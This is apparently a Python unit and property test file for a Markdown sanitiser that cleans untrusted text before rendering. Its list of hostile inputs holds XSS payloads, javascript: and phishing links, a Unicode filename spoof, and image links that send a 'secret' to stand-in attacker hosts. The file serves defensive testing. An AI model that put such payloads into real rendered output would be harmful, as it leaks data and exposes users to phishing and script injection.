"""UT09-54 - UT09-56, PT09-02, PT09-05: Markdown sanitising of untrusted text (U09-57 - U09-59)."""

from __future__ import annotations

import re

import pytest
from hypothesis import given
from hypothesis import strategies as st

from app.common.sanitize import (
    escape_markdown_chunk,
    render_answer_markdown,
    render_marked_markdown,
    safe_markdown,
)
from herness.core.numbers import format_number
from herness.core.types import NumberRef

pytestmark = pytest.mark.unit

QID = "q_0123456789abcdef"
OTHER = "q_fedcba9876543210"
_LINK_RE = re.compile(r"(?<!\\)\[[^\]]*(?<!\\)\]\(([^)]*)\)")


def _unescaped_dollar(text: str) -> bool:
    """True when some ``$`` is not preceded by an odd number of backslashes."""
    for match in re.finditer(r"\$", text):
        slashes = len(text[: match.start()]) - len(text[: match.start()].rstrip("\\"))
        if slashes % 2 == 0:
            return True
    return False


def _assert_post(out: str) -> None:
    """U09-57 postconditions."""
    assert "![" not in out
    assert "](http" not in out.lower()
    assert "<" not in out
    assert ">" not in out
    assert not _unescaped_dollar(out)
    assert re.search(r"(?<!\\):[A-Za-z_]+\[", out) is None
    assert re.search(r"(?<!\\):material/", out) is None
    for target in _LINK_RE.findall(out):
        assert re.fullmatch(r"#ev-q_[0-9a-f]{16}", target), out
    for url in re.finditer(r"(?i)(?<![A-Za-z])(https?://|www\.)", out):  # only in code spans
        assert re.sub(r"\\.", "", out[: url.start()]).count("`") % 2 == 1, out


HOSTILE = [
    "![](http://x/?d=secret)",
    "![alt text](https://evil.example/p.png)",
    "[click](javascript:x)",
    "[click](http://phish.example)",
    '[t](http://a "title")',
    "<https://evil.example/a>",
    "<mailto:a@b.example>",
    "see http://evil.example/x?y=1 now",
    "www.evil.example/path",
    "<script>alert(1)</script>",
    "<img src=x onerror=a>",
    "$\\frac{a}{b}$ and $$x$$",
    ":red[x] and :material/home: and :blue-background[y]",
    "[[a](b)](http://x)",
    "![[a](#ev-q_0123456789abcdef)](x)",
    "x](http:y",
    "\\$ \\[a](http://x)",
    "`code` and ``http://x``",
    "a\x00b\x1b[2Jc\x07",
    "[evidence](#ev-q_fedcba9876543210)",
    "_https://evil.example/?d=secret",
    "x_www.evil.example",
    "_www.evil.example/p",
    "1https://evil.example/x",
    "http\u200b://evil.example/zw and \u202egnp.exe",
]


@pytest.mark.parametrize("text", HOSTILE)
def test_ut09_54_hostile_inputs_meet_postconditions(text: str) -> None:
    """UT09-54 images, links, autolinks, bare URLs, HTML, `$`, directives: postconditions hold."""
    out = safe_markdown(text, allowed_anchor_ids=[QID])
    _assert_post(out)


def test_ut09_54_specific_rewrites() -> None:
    """UT09-54 image -> alt text, link -> text, URL -> code span, HTML escaped, `$` escaped."""
    assert safe_markdown("![alt text](https://e/p.png)") == "alt text"
    assert safe_markdown("[click](javascript:x)") == "click"
    assert safe_markdown("see http://e.example/x now") == "see `http://e.example/x` now"
    assert safe_markdown("<https://e.example/a>") == "`https://e.example/a`"
    assert safe_markdown("a <b> & c") == "a &lt;b&gt; &amp; c"
    assert safe_markdown("cost $5") == "cost \\$5"
    assert safe_markdown(":red[x]") == "\\:red\\[x\\]"
    assert safe_markdown("line1\nline2\tx") == "line1\nline2\tx"
    assert safe_markdown("a\x00b\x1bc") == "abc"
    assert safe_markdown("_https://e.example/?d=s") == "_`https://e.example/?d=s`"
    assert safe_markdown("x_www.e.example") == "x_`www.e.example`"
    assert safe_markdown("1https://e.example") == "1`https://e.example`"


SPOOF = "".join(
    map(chr, [*range(0x200B, 0x2010), *range(0x202A, 0x202F), *range(0x2066, 0x206A), 0xFEFF])
)


def test_ut09_54_unicode_format_characters_removed() -> None:
    """UT09-54 zero-width, bidi embedding/override/isolate characters and the BOM are removed."""
    assert safe_markdown("a" + SPOOF + "b") == "ab"
    assert safe_markdown(chr(0x202E) + "exe.txt") == "exe.txt"
    assert escape_markdown_chunk("a" + SPOOF + "b") == "ab"
    assert all(escape_markdown_chunk(c) == "" for c in SPOOF)  # character-local removal


def test_ut09_54_allowed_anchor_kept_disallowed_dropped() -> None:
    """UT09-54 allowed `#ev-q_...` anchor kept; disallowed id and other targets become text."""
    text = f"[$5 <x>](#ev-{QID}) and [other](#ev-{OTHER}) and [bad](#ev-q_XYZ)"
    out = safe_markdown(text, allowed_anchor_ids=[QID])
    assert out == f"[\\$5 &lt;x&gt;](#ev-{QID}) and other and bad"
    assert safe_markdown(f"[n](#ev-{QID})") == "n"  # nothing allowed by default


def test_ut09_54_input_cut_to_50000_chars() -> None:
    """UT09-54 input over 50,000 characters is cut with a trailing ellipsis."""
    out = safe_markdown("a" * 60_000)
    assert out == "a" * 50_000 + "…"


def test_ut09_54_nested_bracket_input_is_linear() -> None:
    """UT09-54 pathological bracket runs stay fast (linear patterns, no catastrophic backtrack)."""
    for text in ("[" * 50_000, "![](" * 12_500, "<http:" * 8_000, "[a](" * 12_500):
        _assert_post(safe_markdown(text))


@given(st.text(max_size=300))
def test_pt09_02_safe_markdown_property(text: str) -> None:
    """PT09-02 for any string: no `![`, no `](http`, no raw `<` or `>`, no unescaped `$`."""
    _assert_post(safe_markdown(text, allowed_anchor_ids=[QID]))


@given(st.text(alphabet="![]()<>$:`\\ahtp/w.#ev-q_0123456789abcdef \n", max_size=120))
def test_pt09_02_safe_markdown_property_markdown_alphabet(text: str) -> None:
    """PT09-02 the same property over an alphabet dense in Markdown syntax."""
    _assert_post(safe_markdown(text, allowed_anchor_ids=[QID]))


def test_ut09_55_escape_chunk() -> None:
    """UT09-55 "[a](b)": all specials escaped; newline kept; controls removed; HTML escaped."""
    assert escape_markdown_chunk("[a](b)") == "\\[a\\]\\(b\\)"
    assert escape_markdown_chunk("x\ny\tz") == "x\ny\tz"
    assert escape_markdown_chunk("a\x00\x1b\x7f\x85b") == "ab"
    assert escape_markdown_chunk("<&>") == "&lt;&amp;&gt;"
    specials = "\\`*_{}[]()#+-.!|$~:"
    assert escape_markdown_chunk(specials) == "".join("\\" + c for c in specials)


@given(st.text(max_size=100), st.text(max_size=100))
def test_pt09_05_escape_is_character_local(a: str, b: str) -> None:
    """PT09-05 escape(a + b) == escape(a) + escape(b)."""
    assert escape_markdown_chunk(a + b) == escape_markdown_chunk(a) + escape_markdown_chunk(b)


def _ref(nid: str, value: float | int, query_id: str = QID, unit: str = "count") -> NumberRef:
    return NumberRef.model_validate(
        {"id": nid, "value": value, "unit": unit, "query_id": query_id, "column": "c",
         "row_key": None}
    )  # fmt: skip


def test_ut09_56_answer_links_numbers_in_order() -> None:
    """UT09-56 two numbers linked in position order; a number missing from the text unlinked."""
    n2, n10, n3 = _ref("n2", 1234), _ref("n10", 56, OTHER), _ref("n3", 999_999)
    shown2, shown10 = format_number(n2), format_number(n10)
    content = f"Saw {shown10} cases and {shown2} tickets <b>!"
    out = render_answer_markdown(content, [n10, n3, n2])
    assert out == (
        f"Saw [{shown10}](#ev-{OTHER}) cases and [{shown2}](#ev-{QID}) tickets &lt;b&gt;&#33;"
    )
    assert format_number(n3) not in out


def test_ut09_56_answer_number_inside_bigger_number_not_linked() -> None:
    """UT09-56 a display found only inside a longer numeral is not linked (no false anchor)."""
    out = render_answer_markdown("total 123456", [_ref("n1", 1234)])
    assert out == "total 123456"


def test_ut09_56_marked_text_segments_and_unresolved() -> None:
    """UT09-56 marked text: numbers linked, text sanitised, missing NumberRef `[unresolved]`."""
    n1 = _ref("n1", 1234)
    out = render_marked_markdown("A [[n1]] and [[n7]] ![x](http://e) $", [n1])
    assert out == f"A [{format_number(n1)}](#ev-{QID}) and [unresolved] x \\$"


def test_ut09_56_marked_text_unavailable_value_not_linked() -> None:
    """UT09-56 a number formatted `n/a` is shown plain, without an anchor."""
    bad = NumberRef.model_construct(
        id="n1", value="oops", unit="count", query_id=QID, column="c", row_key=None, format=None
    )
    assert render_marked_markdown("x [[n1]]", [bad]) == "x n/a"
